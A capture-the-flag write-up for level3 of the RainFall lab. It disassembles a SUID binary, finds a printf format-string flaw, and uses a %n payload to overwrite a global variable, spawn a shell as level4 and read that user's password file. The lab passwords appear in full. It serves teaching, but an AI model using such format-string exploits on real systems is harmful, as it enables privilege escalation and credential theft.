login as the user `level3`

```shell
$ ssh -p 4242 level3@10.13.100.189
level3@10.13.100.189's password: 492deb0e7d14c4b5695173cca843c4384fe52d0857c2b0718e1a521a4d33ec02
  GCC stack protector support:            Enabled
  Strict user copy checks:                Disabled
  Restrict /dev/mem access:               Enabled
  Restrict /dev/kmem access:              Enabled
  grsecurity / PaX: No GRKERNSEC
  Kernel Heap Hardening: No KERNHEAP
 System-wide ASLR (kernel.randomize_va_space): Off (Setting: 0)
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      FILE
No RELRO        No canary found   NX disabled   No PIE          No RPATH   No RUNPATH   /home/user/level3/level3
level3@RainFall:~$
```

a `SUID` exactable file is locates in the home directory

```shell
level3@RainFall:~$ ls -l
-rwsr-s---+ 1 level4 users 5366 Mar  6  2016 level3
level3@RainFall:~$ ./level3
f
f
```

after inspecting the program with gdb  we find the following

```gdb
(gdb) disas main
Dump of assembler code for function main:
   0x0804851a <+0>:     push   %ebp
   0x0804851b <+1>:     mov    %esp,%ebp
   0x0804851d <+3>:     and    $0xfffffff0,%esp
   0x08048520 <+6>:     call   0x80484a4 <v>
   0x08048525 <+11>:    leave
   0x08048526 <+12>:    ret
End of assembler dump.
(gdb) disas v
Dump of assembler code for function v:
   0x080484a4 <+0>:     push   %ebp
   0x080484a5 <+1>:     mov    %esp,%ebp
   0x080484a7 <+3>:     sub    $0x218,%esp
   0x080484ad <+9>:     mov    0x8049860,%eax
   0x080484b2 <+14>:    mov    %eax,0x8(%esp)
   0x080484b6 <+18>:    movl   $0x200,0x4(%esp)
   0x080484be <+26>:    lea    -0x208(%ebp),%eax
   0x080484c4 <+32>:    mov    %eax,(%esp)
   0x080484c7 <+35>:    call   0x80483a0 <fgets@plt>
   0x080484cc <+40>:    lea    -0x208(%ebp),%eax
   0x080484d2 <+46>:    mov    %eax,(%esp)
   0x080484d5 <+49>:    call   0x8048390 <printf@plt>
   0x080484da <+54>:    mov    0x804988c,%eax
   0x080484df <+59>:    cmp    $0x40,%eax
   0x080484e2 <+62>:    jne    0x8048518 <v+116>
   0x080484e4 <+64>:    mov    0x8049880,%eax
   0x080484e9 <+69>:    mov    %eax,%edx
   0x080484eb <+71>:    mov    $0x8048600,%eax
   0x080484f0 <+76>:    mov    %edx,0xc(%esp)
   0x080484f4 <+80>:    movl   $0xc,0x8(%esp)
   0x080484fc <+88>:    movl   $0x1,0x4(%esp)
   0x08048504 <+96>:    mov    %eax,(%esp)
   0x08048507 <+99>:    call   0x80483b0 <fwrite@plt>
   0x0804850c <+104>:   movl   $0x804860d,(%esp)
   0x08048513 <+111>:   call   0x80483c0 <system@plt>
   0x08048518 <+116>:   leave
   0x08048519 <+117>:   ret
End of assembler dump.
```

we notice that the program reads input from stdin using `fgets` then passes that input as the format string of `printf`. <br>
then the program checks the value of the global variable `m`, if it matches the value `64` it then spawns a shell.

let see if we can exploit this behavior by passing malicious input

```shell
level3@RainFall:~$ objdump -t ./level3  | grep .bss
08049860 l    d  .bss   00000000              .bss
08049884 l     O .bss   00000001              completed.6159
08049888 l     O .bss   00000004              dtor_idx.6161
08049860 g     O .bss   00000004              stdin@@GLIBC_2.0
0804988c g     O .bss   00000004              m
08049880 g     O .bss   00000004              stdout@@GLIBC_2.0
08049844 g       *ABS*  00000000              __bss_start
```

m is a global variable of size 4 bytes located at the address `0x804988c`

```shell
level3@RainFall:~$ ./level3
%p %p Hello world
0x200 0xb7fd1ac0 Hello world
```

it works we can format the input string to read and write to the program's memory

all we have to do is update the value of the variable `m` to pass the challenge <br>
we can use the `%n` flag in print f to write the number of currently printed characters at a specific memory address.

```shell
level3@RainFall:~$ (python -c "print '\x8c\x98\x04\x08' + 'A' * 60 + '%4\$n'"; cat) | ./level3
�AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
Wait what?!
cat /home/user/level4/.pass
b209ea91ad69ef36f2cf0fcbbc24c739fd10464cf545b20bea8572ebdc3c36fa
```

